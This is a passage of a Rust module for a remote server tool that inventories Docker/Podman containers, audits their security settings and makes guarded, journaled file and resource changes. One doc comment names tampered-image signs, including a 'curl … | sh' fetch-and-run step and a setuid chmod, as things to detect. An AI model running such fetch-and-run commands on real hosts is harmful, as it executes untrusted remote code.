//! Target-bound Docker/Podman inventory and guarded container state changes.
//!
//! Remote output is attacker-controlled. Read APIs return bounded typed data,
//! and follow-up commands use only a validated canonical container id. State
//! changes are only reachable through an immutable operation plan followed by
//! the shared confirm/execute/journal/verify-or-restore state machine.

use std::{
    collections::{BTreeMap, BTreeSet},
    fmt,
    future::Future,
    sync::Arc,
    time::Duration,
};

use async_trait::async_trait;
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use serde_json::{Map, Value};
use sha2::{Digest, Sha256};

use crate::events::{TerminalEvent, TerminalEventReceiver, TerminalTransport};
use crate::operations::{
    DangerousConfirmation, ExecutionReceipt, OperationExecutor, OperationPlan, OperationState,
    PlannedOperation, PortableOperationJournal, VerificationResult,
};
use crate::sftp::RemotePath;
use crate::shell_escape::shq;
use crate::ssh::{
    BoundSshSession, ContainerPtyRequest, ContainerPtyRuntime, ContainerPtyShell, SftpRequest,
    SftpResponse, SshCommandOutput, SshService, SshTerminalSession,
};
use crate::target::{TargetContext, TargetGuard};
use crate::{CoreError, CoreResult};

const MAX_COLLECTION_ROWS: usize = 1_000;
const MAX_CELL_CHARS: usize = 4_096;
const MAX_LOG_CHARS: usize = 500_000;
const MAX_INSPECT_BYTES: usize = 1_000_000;
const MAX_NETWORK_METADATA_ENTRIES: usize = 256;
const MAX_SECURITY_AUDIT_BYTES: usize = 16 * 1024 * 1024;
const MAX_SECURITY_FINDINGS: usize = 10_000;

/// Asks the host which runtimes exist and which of them answers.
///
/// `ps -q` rather than `info`: on a host whose daemon is stopped, `info` sits
/// there until something times out, while `ps` fails immediately against the
/// missing socket. Docker wins when both answer, because a host with both
/// almost always keeps its workloads under Docker.
const RUNTIME_PROBE_COMMAND: &str = r#"for lr_rt in docker podman; do
  if command -v "$lr_rt" >/dev/null 2>&1; then
    if "$lr_rt" ps -q >/dev/null 2>&1; then
      printf '%s\tusable\n' "$lr_rt"
    else
      printf '%s\tinstalled\n' "$lr_rt"
    fi
  fi
done"#;
pub const MAX_CONTAINER_FILE_BYTES: usize = 2 * 1024 * 1024;
pub const MAX_DOCKER_FILE_COPY_BYTES: u64 = 64 * 1024 * 1024;

/// What the host said when asked which container runtimes it has.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct ContainerRuntimeProbe {
    /// The runtime that answered, and therefore the only one worth asking
    /// anything else. `None` means every question after this one is moot.
    pub usable: Option<ContainerRuntime>,
    /// Every runtime whose binary exists, answering or not. A Docker here
    /// with `usable` empty is a stopped daemon, not an absent runtime.
    pub installed: Vec<ContainerRuntime>,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "lowercase")]
pub enum ContainerRuntime {
    Docker,
    Podman,
}

impl ContainerRuntime {
    /// The program name, for building a command against this runtime.
    ///
    /// Crate-visible rather than module-private: the command workbench runs
    /// its catalog inside containers too, and it must reach the same binary
    /// this module would rather than keep a second copy of the mapping.
    pub(crate) const fn command(self) -> &'static str {
        match self {
            Self::Docker => "docker",
            Self::Podman => "podman",
        }
    }

    pub const fn label(self) -> &'static str {
        match self {
            Self::Docker => "Docker",
            Self::Podman => "Podman",
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
pub struct ContainerIdentity {
    runtime: ContainerRuntime,
    id: String,
}

impl ContainerIdentity {
    pub fn new(runtime: ContainerRuntime, id: impl Into<String>) -> CoreResult<Self> {
        let id = id.into();
        validate_container_id(&id)?;
        Ok(Self { runtime, id })
    }

    pub const fn runtime(&self) -> ContainerRuntime {
        self.runtime
    }

    pub fn id(&self) -> &str {
        &self.id
    }

    /// The twelve-character form the runtime itself prints.
    ///
    /// For showing a person, so what the pane displays matches what they see
    /// in `docker ps` on the machine. Never for addressing anything: the full
    /// id is what every command is built from.
    pub fn short_id(&self) -> &str {
        short_id(&self.id)
    }

    pub fn stable_key(&self) -> String {
        format!("{}:{}", self.runtime.command(), self.id)
    }
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum ContainerShell {
    Sh,
    Bash,
    Ash,
}

impl ContainerShell {
    pub const fn label(self) -> &'static str {
        match self {
            Self::Sh => "sh",
            Self::Bash => "bash",
            Self::Ash => "ash",
        }
    }

    pub(crate) const fn pty_shell(self) -> ContainerPtyShell {
        match self {
            Self::Sh => ContainerPtyShell::Sh,
            Self::Bash => ContainerPtyShell::Bash,
            Self::Ash => ContainerPtyShell::Ash,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DockerCollection<T> {
    pub items: Vec<T>,
    pub truncated: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ContainerSummary {
    pub identity: ContainerIdentity,
    pub name: String,
    pub image: String,
    pub state: String,
    pub status: String,
    pub ports: String,
    pub created_at: String,
    pub command: String,
}

impl ContainerSummary {
    /// Whether this container has a running process namespace.
    ///
    /// The question behind several different offers — a shell, a command run
    /// inside it — so it is named for what it asks rather than for one of the
    /// things that ask it.
    pub fn is_running(&self) -> bool {
        self.state.eq_ignore_ascii_case("running")
    }

    pub fn can_open_terminal(&self) -> bool {
        self.is_running()
    }
}

/// How long closing a container shell waits for its leftovers to be ended.
const CONTAINER_SESSION_CLEANUP_TIMEOUT: Duration = Duration::from_secs(15);

pub struct ContainerTerminalSession {
    container: ContainerIdentity,
    shell: ContainerShell,
    guard: TargetGuard,
    target: Arc<TargetContext>,
    inner: SshTerminalSession,
    // What closing needs to end the shell's process tree inside the container,
    // which the runtime leaves running when its exec client goes away.
    ssh: SshService,
    session: BoundSshSession,
    cleanup: String,
}

impl fmt::Debug for ContainerTerminalSession {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter
            .debug_struct("ContainerTerminalSession")
            .field("container", &self.container)
            .field("shell", &self.shell)
            .field("guard", &self.guard)
            .field("inner", &self.inner)
            .finish_non_exhaustive()
    }
}

impl ContainerTerminalSession {
    pub fn container(&self) -> &ContainerIdentity {
        &self.container
    }

    pub const fn shell(&self) -> ContainerShell {
        self.shell
    }

    pub fn target(&self) -> &TargetGuard {
        &self.guard
    }

    pub fn terminal_id(&self) -> &str {
        self.inner.terminal_id()
    }

    pub fn events(&self) -> &TerminalEventReceiver {
        self.inner.events()
    }

    pub async fn recv(&self) -> CoreResult<TerminalEvent> {
        self.inner.recv().await
    }
}

#[async_trait]
impl TerminalTransport for ContainerTerminalSession {
    fn events(&self) -> &TerminalEventReceiver {
        self.inner.events()
    }

    async fn write_input(&self, bytes: Vec<u8>) -> CoreResult<()> {
        self.target.validate(&self.guard)?;
        let result = TerminalTransport::write_input(&self.inner, bytes).await;
        self.target.validate(&self.guard)?;
        result
    }

    async fn resize(&self, columns: u16, rows: u16) -> CoreResult<()> {
        self.target.validate(&self.guard)?;
        let result = TerminalTransport::resize(&self.inner, columns, rows).await;
        self.target.validate(&self.guard)?;
        result
    }

    async fn close(&self) -> CoreResult<()> {
        let closed = TerminalTransport::close(&self.inner).await;
        // Best effort and bounded: the container may have stopped, or the
        // connection may be gone. Closing still succeeds either way.
        let _ = self
            .ssh
            .execute_bound(
                &self.session,
                self.cleanup.clone(),
                CONTAINER_SESSION_CLEANUP_TIMEOUT,
            )
            .await;
        closed
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ContainerStats {
    pub identity: ContainerIdentity,
    pub name: String,
    pub cpu_percent: String,
    pub memory_usage: String,
    pub memory_percent: String,
    pub network_io: String,
    pub block_io: String,
    pub pids: Option<u64>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ContainerImage {
    pub runtime: ContainerRuntime,
    pub id: String,
    pub repository: String,
    pub tag: String,
    pub digest: String,
    pub created_at: String,
    pub size: String,
}

impl ContainerImage {
    pub fn stable_key(&self) -> String {
        format!("{}:image:{}", self.runtime.command(), self.id)
    }

    /// The 12 characters a runtime prints for this image, without the
    /// `sha256:` the long form carries. Display only: nothing is looked up by
    /// it, because a short id is not unique by construction.
    pub fn short_id(&self) -> &str {
        let bare = self.id.strip_prefix("sha256:").unwrap_or(&self.id);
        &bare[..bare.len().min(12)]
    }
}

/// One step of `image history` — the instruction that built a layer.
///
/// This is where a tampered image shows itself: the added `curl … | sh`, the
/// extra `COPY`, the `chmod 4755`. The instruction text is whatever the
/// runtime recorded and is displayed as-is.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DockerImageHistoryStep {
    pub id: String,
    pub created_at: String,
    pub created_by: String,
    pub size: String,
    pub comment: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DockerImageInspection {
    pub image: ContainerImage,
    pub architecture: String,
    pub os: String,
    pub author: String,
    /// The user the image runs as. Empty means the image never set one, which
    /// is the same as root — the reader is told which of the two it is.
    pub user: String,
    pub entrypoint: Vec<String>,
    pub command: Vec<String>,
    pub working_dir: String,
    pub environment: Vec<String>,
    pub exposed_ports: Vec<String>,
    pub declared_volumes: Vec<String>,
    pub labels: BTreeMap<String, String>,
    pub layers: Vec<String>,
    pub repo_tags: Vec<String>,
    pub repo_digests: Vec<String>,
    pub history: Vec<DockerImageHistoryStep>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DockerNetwork {
    pub runtime: ContainerRuntime,
    pub id: String,
    pub name: String,
    pub driver: String,
    pub scope: String,
    pub internal: bool,
    pub ipv6: bool,
}

impl DockerNetwork {
    pub fn stable_key(&self) -> String {
        format!("{}:network:{}", self.runtime.command(), self.id)
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DockerNetworkIpamConfig {
    pub subnet: String,
    pub gateway: String,
    pub ip_range: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DockerNetworkAttachment {
    pub container_id: String,
    pub name: String,
    pub endpoint_id: String,
    pub mac_address: String,
    pub ipv4_address: String,
    pub ipv6_address: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DockerNetworkInspection {
    pub network: DockerNetwork,
    pub attachable: bool,
    pub ingress: bool,
    pub ipam_driver: String,
    pub ipam: Vec<DockerNetworkIpamConfig>,
    pub attachments: Vec<DockerNetworkAttachment>,
    pub options: BTreeMap<String, String>,
    pub labels: BTreeMap<String, String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DockerVolume {
    pub runtime: ContainerRuntime,
    pub name: String,
    pub driver: String,
    pub mountpoint: String,
    pub scope: String,
    pub labels: String,
}

impl DockerVolume {
    pub fn stable_key(&self) -> String {
        format!("{}:volume:{}", self.runtime.command(), self.name)
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DockerVolumeInspection {
    pub volume: DockerVolume,
    pub created_at: String,
    pub options: BTreeMap<String, String>,
    pub labels: BTreeMap<String, String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DockerComposeProject {
    pub runtime: ContainerRuntime,
    pub name: String,
    pub status: String,
    pub config_files: String,
    pub services: u64,
    pub running: u64,
    pub stopped: u64,
}

impl DockerComposeProject {
    pub fn stable_key(&self) -> String {
        format!("{}:compose:{}", self.runtime.command(), self.name)
    }
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum DockerResourceMutationKind {
    RemoveNetwork,
    PruneNetworks,
    RemoveVolume,
    PruneVolumes,
}

impl DockerResourceMutationKind {
    pub const fn label(self) -> &'static str {
        match self {
            Self::RemoveNetwork => "删除网络",
            Self::PruneNetworks => "清理未使用网络",
            Self::RemoveVolume => "删除数据卷",
            Self::PruneVolumes => "清理未使用数据卷",
        }
    }

    pub const fn id(self) -> &'static str {
        match self {
            Self::RemoveNetwork => "remove-network",
            Self::PruneNetworks => "prune-networks",
            Self::RemoveVolume => "remove-volume",
            Self::PruneVolumes => "prune-volumes",
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum DockerResourceMutationRequest {
    RemoveNetwork { network: DockerNetwork },
    PruneNetworks { runtime: ContainerRuntime },
    RemoveVolume { volume: DockerVolume },
    PruneVolumes { runtime: ContainerRuntime },
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum DockerResourceTarget {
    Network { id: String, name: String },
    Volume { name: String },
}

impl DockerResourceTarget {
    pub fn label(&self) -> &str {
        match self {
            Self::Network { name, .. } | Self::Volume { name } => name,
        }
    }
}

/// Immutable resource mutation plan. It deliberately exposes typed resource
/// identities but never the generated shell commands.
#[derive(Debug, Clone)]
pub struct DockerResourceMutationPlan {
    operation: OperationPlan,
    kind: DockerResourceMutationKind,
    runtime: ContainerRuntime,
    targets: Vec<DockerResourceTarget>,
    network_snapshots: Vec<DockerNetworkInspection>,
    volume_snapshots: Vec<DockerVolumeInspection>,
}

impl DockerResourceMutationPlan {
    pub fn definition(&self) -> &OperationPlan {
        &self.operation
    }

    pub const fn kind(&self) -> DockerResourceMutationKind {
        self.kind
    }

    pub const fn runtime(&self) -> ContainerRuntime {
        self.runtime
    }

    pub fn targets(&self) -> &[DockerResourceTarget] {
        &self.targets
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DockerResourceMutationOutcome {
    pub operation_id: String,
    pub kind: DockerResourceMutationKind,
    pub affected: usize,
    pub verified: bool,
    pub verification_detail: String,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum DockerComposeAction {
    Up,
    Down,
    Restart,
    Stop,
    Pull,
}

impl DockerComposeAction {
    pub const ALL: [Self; 5] = [Self::Up, Self::Down, Self::Restart, Self::Stop, Self::Pull];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Up => "启动",
            Self::Down => "下线",
            Self::Restart => "重启",
            Self::Stop => "停止",
            Self::Pull => "拉取镜像",
        }
    }

    pub const fn id(self) -> &'static str {
        match self {
            Self::Up => "up",
            Self::Down => "down",
            Self::Restart => "restart",
            Self::Stop => "stop",
            Self::Pull => "pull",
        }
    }

    pub fn is_available(self, project: &DockerComposeProject) -> bool {
        match self {
            Self::Restart | Self::Stop => project.running > 0,
            Self::Up | Self::Down | Self::Pull => true,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DockerComposeActionRequest {
    pub project: DockerComposeProject,
    pub action: DockerComposeAction,
}

/// Immutable Compose mutation plan. Config files are parsed into validated
/// absolute paths before a plan can exist; raw inventory text never reaches a
/// command builder.
#[derive(Debug, Clone)]
pub struct DockerComposeActionPlan {
    operation: OperationPlan,
    project: DockerComposeProject,
    config_files: Vec<RemotePath>,
    action: DockerComposeAction,
}

impl DockerComposeActionPlan {
    pub fn definition(&self) -> &OperationPlan {
        &self.operation
    }

    pub fn project(&self) -> &DockerComposeProject {
        &self.project
    }

    pub fn config_files(&self) -> &[RemotePath] {
        &self.config_files
    }

    pub const fn action(&self) -> DockerComposeAction {
        self.action
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DockerComposeActionOutcome {
    pub operation_id: String,
    pub action: DockerComposeAction,
    pub verified: bool,
    pub verification_detail: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ContainerInspectionField {
    pub label: String,
    pub value: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ContainerMount {
    pub kind: String,
    pub source: String,
    pub destination: String,
    pub mode: String,
    pub read_write: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ContainerNetwork {
    pub name: String,
    pub network_id: String,
    pub endpoint_id: String,
    pub mac_address: String,
    pub ipv4_address: String,
    pub ipv6_address: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ContainerInspection {
    pub identity: ContainerIdentity,
    pub name: String,
    pub fields: Vec<ContainerInspectionField>,
    pub mounts: Vec<ContainerMount>,
    pub networks: Vec<ContainerNetwork>,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "lowercase")]
pub enum DockerSecuritySeverity {
    Critical,
    High,
    Medium,
    Low,
    Info,
}

impl DockerSecuritySeverity {
    pub const fn label(self) -> &'static str {
        match self {
            Self::Critical => "严重",
            Self::High => "高危",
            Self::Medium => "中危",
            Self::Low => "低危",
            Self::Info => "信息",
        }
    }

    const fn score_penalty(self) -> u8 {
        match self {
            Self::Critical => 15,
            Self::High => 8,
            Self::Medium => 4,
            Self::Low => 2,
            Self::Info => 0,
        }
    }
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "kebab-case")]
pub enum DockerSecurityCategory {
    Privileged,
    Capabilities,
    Network,
    Mount,
    Image,
    ResourceLimits,
    Health,
}

impl DockerSecurityCategory {
    pub const fn label(self) -> &'static str {
        match self {
            Self::Privileged => "特权与命名空间",
            Self::Capabilities => "Linux Capabilities",
            Self::Network => "网络暴露",
            Self::Mount => "危险挂载",
            Self::Image => "镜像标签",
            Self::ResourceLimits => "资源限制",
            Self::Health => "健康检查",
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DockerSecurityFinding {
    pub id: String,
    pub severity: DockerSecuritySeverity,
    pub category: DockerSecurityCategory,
    pub container: ContainerIdentity,
    pub container_name: String,
    pub description: String,
    pub remediation: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DockerSecuritySummary {
    pub critical: usize,
    pub high: usize,
    pub medium: usize,
    pub low: usize,
    pub info: usize,
    pub total: usize,
    pub score: u8,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DockerSecurityAudit {
    pub runtime: ContainerRuntime,
    pub containers_scanned: usize,
    pub findings: Vec<DockerSecurityFinding>,
    pub summary: DockerSecuritySummary,
    pub truncated: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ContainerLogsRequest {
    pub container: ContainerIdentity,
    pub tail: usize,
    pub since: Option<String>,
    pub timestamps: bool,
    pub stdout: bool,
    pub stderr: bool,
}

impl ContainerLogsRequest {
    pub fn recent(container: ContainerIdentity) -> Self {
        Self {
            container,
            tail: 200,
            since: None,
            timestamps: true,
            stdout: true,
            stderr: true,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ContainerLogs {
    pub identity: ContainerIdentity,
    pub text: String,
    pub truncated: bool,
}

/// The most filesystem changes kept from one `docker diff`.
pub const MAX_CONTAINER_CHANGES: usize = 5_000;
/// The most processes kept from one `docker top`.
pub const MAX_CONTAINER_PROCESSES: usize = 2_000;
const MAX_CHANGE_PATH_CHARS: usize = 4_096;
const MAX_PROCESS_FIELD_CHARS: usize = 4_096;
const MAX_PROCESS_COLUMNS: usize = 16;

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum ContainerChangeKind {
    Added,
    Changed,
    Deleted,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ContainerChange {
    pub kind: ContainerChangeKind,
    pub path: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ContainerChanges {
    pub identity: ContainerIdentity,
    pub items: Vec<ContainerChange>,
    /// More changes than kept, or lines that were not changes.
    pub truncated: bool,
    /// Lines that did not read as a change (a runtime warning), counted, not shown as changes.
    pub unreadable_lines: usize,
}

/// The runtime's own columns: `docker top` prints `ps -ef`'s, `podman top`
/// its own. Kept as they came, so neither is reshaped into the other.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ContainerProcesses {
    pub identity: ContainerIdentity,
    pub titles: Vec<String>,
    pub rows: Vec<Vec<String>>,
    pub truncated: bool,
}

/// Absolute path inside a container. It deliberately reuses the strict POSIX
/// path grammar used by SFTP while keeping the two domains distinct at the API.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord, Hash)]
#[serde(try_from = "String", into = "String")]
pub struct ContainerFilePath(RemotePath);

impl ContainerFilePath {
    pub fn new(value: impl Into<String>) -> CoreResult<Self> {
        let path = RemotePath::new(value)?;
        path.file_name().map_err(|_| {
            CoreError::validation("container file path", "container root is not a file")
        })?;
        Ok(Self(path))
    }

    pub fn as_str(&self) -> &str {
        self.0.as_str()
    }

    fn parent(&self) -> CoreResult<RemotePath> {
        self.0.parent()
    }
}

impl TryFrom<String> for ContainerFilePath {
    type Error = CoreError;

    fn try_from(value: String) -> Result<Self, Self::Error> {
        Self::new(value)
    }
}

impl From<ContainerFilePath> for String {
    fn from(value: ContainerFilePath) -> Self {
        value.0.into()
    }
}

/// An exact, bounded UTF-8 snapshot of a regular file inside a container.
///
/// The snapshot is minted only after the service has compared the downloaded
/// bytes with both the pre-read and post-read remote SHA-256/length markers.
/// Its content is intentionally redacted from `Debug` output.
#[derive(Clone, PartialEq, Eq)]
pub struct DockerFileContent {
    container: ContainerIdentity,
    path: ContainerFilePath,
    content: Arc<str>,
    revision: ContainerFileState,
}

impl DockerFileContent {
    pub fn container(&self) -> &ContainerIdentity {
        &self.container
    }

    pub fn path(&self) -> &ContainerFilePath {
        &self.path
    }

    pub fn content(&self) -> &str {
        &self.content
    }

    pub fn content_bytes(&self) -> usize {
        self.content.len()
    }

    pub fn sha256(&self) -> &str {
        match &self.revision {
            ContainerFileState::File { sha256, .. } => sha256,
            ContainerFileState::Missing => unreachable!("file snapshots are never missing"),
        }
    }
}

impl fmt::Debug for DockerFileContent {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter
            .debug_struct("DockerFileContent")
            .field("container", &self.container)
            .field("path", &self.path)
            .field(
                "content",
                &format_args!("<redacted:{} bytes>", self.content.len()),
            )
            .field("revision", &self.revision.summary())
            .finish()
    }
}

#[derive(Clone)]
pub struct DockerFileWriteRequest {
    pub container: ContainerIdentity,
    pub path: ContainerFilePath,
    content: Arc<str>,
    expected_before: Option<ContainerFileState>,
}

impl DockerFileWriteRequest {
    pub fn new(
        container: ContainerIdentity,
        path: ContainerFilePath,
        content: impl Into<String>,
    ) -> CoreResult<Self> {
        let content = content.into();
        if content.len() > MAX_CONTAINER_FILE_BYTES {
            return Err(CoreError::validation(
                "container file content",
                format!("must be at most {MAX_CONTAINER_FILE_BYTES} bytes"),
            ));
        }
        Ok(Self {
            container,
            path,
            content: Arc::from(content),
            expected_before: None,
        })
    }

    /// Build an edit request bound to the exact file snapshot presented to the
    /// operator. A concurrent remote edit therefore invalidates planning
    /// instead of being silently overwritten.
    pub fn replace(loaded: &DockerFileContent, content: impl Into<String>) -> CoreResult<Self> {
        let mut request = Self::new(loaded.container.clone(), loaded.path.clone(), content)?;
        request.expected_before = Some(loaded.revision.clone());
        Ok(request)
    }

    pub fn content_bytes(&self) -> usize {
        self.content.len()
    }
}

impl fmt::Debug for DockerFileWriteRequest {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter
            .debug_struct("DockerFileWriteRequest")
            .field("container", &self.container)
            .field("path", &self.path)
            .field(
                "content",
                &format_args!("<redacted:{} bytes>", self.content.len()),
            )
            .field(
                "expected_before",
                &self
                    .expected_before
                    .as_ref()
                    .map(ContainerFileState::summary),
            )
            .finish()
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum ContainerFileState {
    Missing,
    File { sha256: String, bytes: u64 },
}

impl ContainerFileState {
    pub(crate) fn summary(&self) -> String {
        match self {
            Self::Missing => "missing".to_owned(),
            Self::File { sha256, bytes } => format!("file:{bytes}:{sha256}"),
        }
    }

    /// The same state in words an operator reads, about `subject`.
    fn description(&self, subject: &str) -> String {
        match self {
            Self::Missing => format!("{subject}不存在"),
            Self::File { bytes, .. } => format!("{subject}现为 {bytes} 字节"),
        }
    }
}

/// The first twelve characters, as `docker ps` prints an id.
fn short_container_id(id: &str) -> &str {
    id.get(..12).unwrap_or(id)
}

/// Immutable, target-bound plan for one container config-file write.
#[derive(Clone)]
pub struct DockerFileWritePlan {
    operation: OperationPlan,
    container: ContainerIdentity,
    path: ContainerFilePath,
    content: Arc<str>,
    content_sha256: String,
    before: ContainerFileState,
    container_temp_path: ContainerFilePath,
    backup_path: ContainerFilePath,
    host_temp_path: RemotePath,
}

impl DockerFileWritePlan {
    pub fn definition(&self) -> &OperationPlan {
        &self.operation
    }

    pub fn container(&self) -> &ContainerIdentity {
        &self.container
    }

    pub fn path(&self) -> &ContainerFilePath {
        &self.path
    }

    pub fn backup_path(&self) -> &ContainerFilePath {
        &self.backup_path
    }

    pub fn content_bytes(&self) -> usize {
        self.content.len()
    }

    pub fn content_sha256(&self) -> &str {
        &self.content_sha256
    }

    /// The file as it was found when the plan was made, in words.
    pub fn before_description(&self) -> String {
        self.before.description("文件")
    }
}

impl fmt::Debug for DockerFileWritePlan {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter
            .debug_struct("DockerFileWritePlan")
            .field("operation", &self.operation)
            .field("container", &self.container)
            .field("path", &self.path)
            .field(
                "content",
                &format_args!("<redacted:{} bytes>", self.content.len()),
            )
            .field("content_sha256", &self.content_sha256)
            .field("before", &self.before)
            .finish_non_exhaustive()
    }
}

/// Opaque typed replacement for the legacy raw `restore_command` receipt.
#[derive(Debug, Clone)]
pub struct DockerFileRestoreReceipt {
    target: TargetGuard,
    container: ContainerIdentity,
    path: ContainerFilePath,
    backup_path: Option<ContainerFilePath>,
    before: ContainerFileState,
    written_sha256: String,
    written_bytes: u64,
}

impl DockerFileRestoreReceipt {
    pub fn target(&self) -> &TargetGuard {
        &self.target
    }

    pub fn container(&self) -> &ContainerIdentity {
        &self.container
    }

    pub fn path(&self) -> &ContainerFilePath {
        &self.path
    }

    pub fn backup_path(&self) -> Option<&ContainerFilePath> {
        self.backup_path.as_ref()
    }

    pub fn written_sha256(&self) -> &str {
        &self.written_sha256
    }

    pub const fn written_bytes(&self) -> u64 {
        self.written_bytes
    }

    pub fn had_original_file(&self) -> bool {
        matches!(self.before, ContainerFileState::File { .. })
    }
}

#[derive(Debug, Clone)]
pub struct DockerFileWriteOutcome {
    pub operation_id: String,
    pub verified: bool,
    pub verification_detail: String,
    pub restored_after_failed_verification: bool,
    pub restore_receipt: Option<DockerFileRestoreReceipt>,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum DockerFileCopyDirection {
    ContainerToHost,
    HostToContainer,
    InContainer,
}

impl DockerFileCopyDirection {
    pub const ALL: [Self; 3] = [
        Self::ContainerToHost,
        Self::HostToContainer,
        Self::InContainer,
    ];

    pub const fn id(self) -> &'static str {
        match self {
            Self::ContainerToHost => "container-to-host",
            Self::HostToContainer => "host-to-container",
            Self::InContainer => "in-container",
        }
    }

    pub const fn label(self) -> &'static str {
        match self {
            Self::ContainerToHost => "容器 → 远端主机",
            Self::HostToContainer => "远端主机 → 容器",
            Self::InContainer => "容器内部",
        }
    }
}

/// Closed path grammar for one Docker file-copy direction. Host paths always
/// mean paths on the bound SSH target, never paths on the local workstation.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DockerFileCopyRequest {
    ContainerToHost {
        container: ContainerIdentity,
        source: ContainerFilePath,
        target: RemotePath,
    },
    HostToContainer {
        container: ContainerIdentity,
        source: RemotePath,
        target: ContainerFilePath,
    },
    InContainer {
        container: ContainerIdentity,
        source: ContainerFilePath,
        target: ContainerFilePath,
    },
}

impl DockerFileCopyRequest {
    pub const fn direction(&self) -> DockerFileCopyDirection {
        match self {
            Self::ContainerToHost { .. } => DockerFileCopyDirection::ContainerToHost,
            Self::HostToContainer { .. } => DockerFileCopyDirection::HostToContainer,
            Self::InContainer { .. } => DockerFileCopyDirection::InContainer,
        }
    }

    pub fn container(&self) -> &ContainerIdentity {
        match self {
            Self::ContainerToHost { container, .. }
            | Self::HostToContainer { container, .. }
            | Self::InContainer { container, .. } => container,
        }
    }

    pub fn source_path(&self) -> &str {
        match self {
            Self::ContainerToHost { source, .. } | Self::InContainer { source, .. } => {
                source.as_str()
            }
            Self::HostToContainer { source, .. } => source.as_str(),
        }
    }

    pub fn target_path(&self) -> &str {
        match self {
            Self::ContainerToHost { target, .. } => target.as_str(),
            Self::HostToContainer { target, .. } | Self::InContainer { target, .. } => {
                target.as_str()
            }
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum DockerFileEndpoint {
    Host(RemotePath),
    Container(ContainerFilePath),
}

impl DockerFileEndpoint {
    fn path(&self) -> &str {
        match self {
            Self::Host(path) => path.as_str(),
            Self::Container(path) => path.as_str(),
        }
    }

    const fn domain_label(&self) -> &'static str {
        match self {
            Self::Host(_) => "远端主机上的",
            Self::Container(_) => "容器里的",
        }
    }
}

#[derive(Clone)]
pub struct DockerFileCopyPlan {
    operation: OperationPlan,
    container: ContainerIdentity,
    direction: DockerFileCopyDirection,
    source: DockerFileEndpoint,
    target: DockerFileEndpoint,
    source_revision: ContainerFileState,
    target_before: ContainerFileState,
    target_temporary: DockerFileEndpoint,
    target_backup: DockerFileEndpoint,
}

impl DockerFileCopyPlan {
    pub fn definition(&self) -> &OperationPlan {
        &self.operation
    }

